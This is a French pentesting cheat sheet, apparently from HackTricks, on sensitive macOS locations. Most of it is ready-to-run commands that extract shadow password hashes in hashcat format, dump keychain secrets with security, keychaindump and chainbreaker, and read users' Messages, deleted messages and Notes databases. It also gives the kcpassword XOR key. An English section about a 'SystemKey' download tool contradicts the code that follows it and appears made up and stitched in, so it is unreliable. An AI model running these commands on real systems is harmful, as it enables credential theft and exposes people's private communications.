# Emplacements sensibles de macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mots de passe

### Mots de passe Shadow

Le mot de passe Shadow est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
Le oneliner suivant peut être utilisé pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hachage) :

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Des scripts comme celui-ci**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**celui-ci**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash en **format hashcat**.

Une alternative en une seule ligne qui permettra de décharger les informations d'identification de tous les comptes non-service au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Extraction de Keychain

Notez que lors de l'utilisation de la commande binaire security pour extraire les mots de passe décryptés, plusieurs invites demanderont à l'utilisateur d'autoriser cette opération.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
D'après ce commentaire [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), il semble que ces outils ne fonctionnent plus sur Big Sur.
{% endhint %}

L'attaquant doit toujours accéder au système et obtenir des privilèges **root** pour exécuter **keychaindump**. Cette approche comporte ses propres conditions. Comme mentionné précédemment, **à la connexion, votre trousseau est déverrouillé par défaut** et reste déverrouillé pendant que vous utilisez votre système. Cela est pratique pour que l'utilisateur n'ait pas à entrer son mot de passe chaque fois qu'une application souhaite accéder au trousseau. Si l'utilisateur a modifié ce paramètre et choisi de verrouiller le trousseau après chaque utilisation, keychaindump ne fonctionnera plus ; il dépend d'un trousseau déverrouillé pour fonctionner.

Il est important de comprendre comment Keychaindump extrait les mots de passe de la mémoire. Le processus le plus important dans cette transaction est le "**securityd**" **processus**. Apple fait référence à ce processus comme un **démon de contexte de sécurité pour les opérations d'autorisation et cryptographiques**. Les bibliothèques de développement Apple n'en disent pas beaucoup à ce sujet ; cependant, elles nous disent que securityd gère l'accès au trousseau. Dans ses recherches, Juuso fait référence à la **clé nécessaire pour décrypter le trousseau comme "La clé principale"**. Un certain nombre d'étapes doivent être prises pour acquérir cette clé car elle est dérivée du mot de passe de connexion OS X de l'utilisateur. Si vous voulez lire le fichier de trousseau, vous devez avoir cette clé principale. Les étapes suivantes peuvent être effectuées pour l'acquérir. **Effectuez une analyse du tas de securityd (keychaindump le fait avec la commande vmmap)**. Les clés principales possibles sont stockées dans une zone marquée comme MALLOC\_TINY. Vous pouvez voir les emplacements de ces tas vous-même avec la commande suivante :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** recherchera ensuite dans les tas retournés les occurrences de 0x0000000000000018. Si la valeur suivante de 8 octets pointe vers le tas actuel, nous avons trouvé une clé principale potentielle. À partir de là, il faut encore effectuer un peu de désobfuscation, ce qui peut être vu dans le code source, mais en tant qu'analyste, la partie la plus importante à noter est que les données nécessaires pour décrypter ces informations sont stockées dans la mémoire du processus securityd. Voici un exemple de sortie de keychain dump.
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un trousseau de clés OSX de manière forensiquement fiable :

* Mot de passe de trousseau de clés haché, adapté pour le craquage avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
* Mots de passe Internet
* Mots de passe génériques
* Clés privées
* Clés publiques
* Certificats X509
* Notes sécurisées
* Mots de passe Appleshare

Avec le mot de passe de déverrouillage du trousseau de clés, une clé maître obtenue à l'aide de [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey, Chainbreaker fournira également des mots de passe en texte clair.

Sans l'une de ces méthodes de déverrouillage du trousseau de clés, Chainbreaker affichera toutes les autres informations disponibles.

### **Extraire les clés du trousseau de clés**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) avec SystemKey**

---

#### Description

SystemKey is a tool that can be used to dump keychain keys (with passwords) from a macOS system. This can be useful during a penetration test to obtain sensitive information such as passwords and other credentials.

#### Usage

To use SystemKey, follow these steps:

1. Download the SystemKey binary from the [GitHub repository](https://github.com/kennytm/SystemKey/releases).
2. Open a Terminal window and navigate to the directory where the SystemKey binary is located.
3. Run the following command to dump the keychain keys:

```
./SystemKey dump
```

This will dump all keychain keys (with passwords) to the Terminal window.

#### Mitigation

To mitigate the risk of keychain key dumping, sensitive information should not be stored in the keychain. Additionally, access to the keychain should be restricted to only authorized users.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) en craquant le hash**

Pour extraire les clés du trousseau d'un utilisateur sur macOS, il est possible de craquer le hash du trousseau. Pour cela, il faut d'abord extraire le hash du trousseau à partir du fichier `~/Library/Keychains/login.keychain-db`. Ensuite, il est possible d'utiliser des outils de cracking de hash tels que John the Ripper ou Hashcat pour récupérer les mots de passe associés aux clés du trousseau. 

Il est important de noter que cette technique est considérée comme une violation de la vie privée et peut être illégale sans autorisation préalable. Elle ne doit être utilisée qu'à des fins de test de pénétration ou de recherche de vulnérabilités dans un environnement contrôlé et autorisé.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) avec une capture de mémoire**

[Suivez ces étapes](..#dumping-memory-with-osxpmem) pour effectuer une **capture de mémoire**.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **Extraire les clés du trousseau (avec les mots de passe) en utilisant le mot de passe de l'utilisateur**

Si vous connaissez le mot de passe de l'utilisateur, vous pouvez l'utiliser pour **extraire et décrypter les trousseaux qui appartiennent à l'utilisateur**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Le fichier **kcpassword** est un fichier qui contient le **mot de passe de connexion de l'utilisateur**, mais seulement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l'utilisateur sera automatiquement connecté sans être invité à entrer un mot de passe (ce qui n'est pas très sécurisé).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xored avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l'utilisateur est plus long que la clé, la clé sera réutilisée.\
Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**celui-ci**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informations intéressantes dans les bases de données

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Vous pouvez trouver les données de Notifications dans `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La plupart des informations intéressantes se trouvent dans le **blob**. Vous devrez donc **extraire** ce contenu et le **transformer** en un format **lisible** pour l'homme ou utiliser **`strings`**. Pour y accéder, vous pouvez faire :

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

Les notes des utilisateurs peuvent être trouvées dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
